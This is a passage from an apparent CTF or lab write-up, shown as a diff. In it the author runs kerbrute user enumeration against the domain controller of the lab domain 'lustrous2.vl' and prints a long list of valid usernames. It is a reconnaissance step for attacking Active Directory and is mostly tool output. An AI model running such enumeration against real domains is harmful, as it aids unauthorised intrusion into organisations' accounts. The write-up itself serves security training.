@@ -238,3 +238,85 @@ ftp>
 
 Also found a long list of names, they look like users due to the `sharesvc` account
 
+So my plan is to put these users into a userlist, then use kerbrute and see which ones are valid
+
+## Finding valid users
+
+```python
+kerbrute userenum --dc lus2dc.lustrous2.vl -d lustrous2.vl users.txt -v
+
+...[SNIP]...
+
+2026/08/12 16:37:32 >  [!] Christopher.Lawso@lustrous2.vl - User does not exist
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Amber.Ward@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Chloe.Hammond@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Chelsea.Smith@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Callum.Oliver@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Adam.Barnes@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Ann.Lynch@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Andrea.Smith@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Aaron.Norman@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Carly.Walker@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Darren.Lewis@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Claire.Parry@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Deborah.Jones@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Dominic.West@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Elaine.Gallagher@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Francesca.Norman@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Emma.Bell@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Eleanor.Gregory@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Gary.Richards@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Duncan.Smith@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Glenn.Williams@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Gerard.Ward@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Graeme.Pritchard@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Howard.Robinson@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Henry.Connor@lustrous2.vl
+2026/08/12 16:37:32 >  [!] Jacqueline.Philli@lustrous2.vl - User does not exist
+2026/08/12 16:37:32 >  [!] Harriet.Richardso@lustrous2.vl - User does not exist
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Joan.Wall@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Jasmine.Johnson@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Janice.Collier@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Justin.Williams@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Kyle.Hussain@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Judith.Francis@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Kyle.Lloyd@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Leah.Elliott@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Lewis.Khan@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Lawrence.Bryan@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Liam.Wheeler@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Louis.Phillips@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Lisa.Begum@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Marie.Hill@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Lydia.Parker@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Martin.Hamilton@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Malcolm.Yates@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Melissa.Thompson@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Nicola.Hall@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Ryan.Davies@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Robert.Russell@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Pamela.Taylor@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Mathew.Roberts@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Nicola.Clarke@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Nathan.Carter@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Ryan.Moore@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Nigel.Lee@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Ryan.Rowe@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Sharon.Birch@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Samantha.Smith@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Sara.Matthews@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Sharon.Evans@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Stacey.Griffiths@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	ShareSvc@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Stephanie.Baxter@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Stephanie.Davies@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Stacey.Barber@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Steven.Sutton@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Susan.Johnson@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Thomas.Myers@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Terence.Jordan@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Tony.Davies@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Wayne.Taylor@lustrous2.vl
+2026/08/12 16:37:32 >  [+] VALID USERNAME:	Victoria.Williams@lustrous2.vl
+2026/08/12 16:37:32 >  Done! Tested 71 usernames (68 valid) in 0.125 seconds
+```
